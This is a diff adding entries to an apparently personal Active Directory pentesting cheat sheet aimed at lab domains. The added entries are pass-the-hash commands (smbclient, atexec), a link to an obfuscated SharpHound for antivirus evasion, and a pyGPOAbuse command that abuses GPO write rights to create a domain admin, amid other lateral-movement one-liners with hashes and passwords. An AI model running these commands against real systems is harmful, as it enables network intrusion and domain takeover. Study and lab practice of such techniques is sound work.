@@ -1043,6 +1043,9 @@ https://github.com/helidem/CVE-2025-24054_CVE-2025-24071-PoC
 ==> There is also a module in NXC for this :
 nxc smb $target -u 'clerk.john' -p 'clerkhill' -M slinky -o NAME=Final_test SERVER=10.200.62.83
 
+****** Additional Commands to access Shares *****
+smbclient.py -hashes :d5cad8a9782b2879bf316f56936f1e36 administrator@10.1.26.225
+
 ```
 
 **Share To RCE :** 
@@ -1367,6 +1370,8 @@ sudo bloodhound --no-sandbox
 # Ingestors : 
 
 bloodhound-python -u nik -p 'ToastyBoi!' -ns 10.113.189.188 -d LAB.ENTERPRISE.THM -c all
+==> If there is an AV , use Obfuscated Sharphound :
+https://github.com/Flangvik/ObfuscatedSharpCollection/blob/main/NetFramework_4.7_Any/SharpHound.exe._obf.exe
 
 # Using a TGT :
 bloodhound-python -u 'Brandon_Boyd' -d 'anomaly.hsm' -dc 'Anomaly-DC.anomaly.hsm' -ns $target -c all -k -no-pass --dns-tcp --zip
@@ -1847,6 +1852,10 @@ evil-winrm -i IP -k PublicKeyExtracted -c CertExtracted -S
 
 xfreerdp /v:$target /u:username /p:password /cert:ignore +clipboard /dynamic-resolution /drive:  + net use will show our shared drive content . 
 
+# Using atexec : this will create a task for each command :
+
+atexec.py administrator@EC2AMAZ-NS87CNK.hsm.local -hashes :d5cad8a9782b2879bf316f56936f1e36 "whoami"
+
 # Via WMI :
 
 impacket-wmiexec anomaly.hsm/anna_molly@$target -hashes ':be4bf3131851aee9a424c58e02879f6e'
@@ -1868,6 +1877,7 @@ python3 wmiexec2.py anomaly.hsm/anna_molly@$target -hashes ':be4bf3131851aee9a42
 #### Quick Tips :
 
 - **Genric Write Can allow us to move a user to an OU, in case we had Generic ALL over an OU**
+- **Generic Write over the GPO can grant us DA , we use GPOabuse and it will create a new user that is DA**
 
 
 ```bash
@@ -1912,6 +1922,9 @@ dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal 'emma.
 bloodyad --host DC.domain.local -d 'domain.local' -u 'YOURUSER' -p 'YOURPASS' get object 'ACCOUNT$' --attr msDS-ManagedPassword
 nxc ldap $target -u 'YOURUSER' -p 'YOURPASS' --gmsa
 
+## Generic Write over the GPO . 
+https://github.com/Hackndo/pyGPOAbuse
+python3 pygpoabuse.py 'hsm.local'/'bbarkinson' -hashes ':53c3709ae3d9f4428a230db81361ffbc' -gpo-id "526CDF3A-10B6-4B00-BCFA-36E59DCD71A2" -f
 
 # ACL Check : to verify the User's ACLs via Powershell : 
 $user = Get-DomainUser svc-backup
@@ -1924,6 +1937,8 @@ DS-Replication-Get-Changes-All
 it s game over . 
 
 ```
+
+
 
 ### WMI Profile :
 
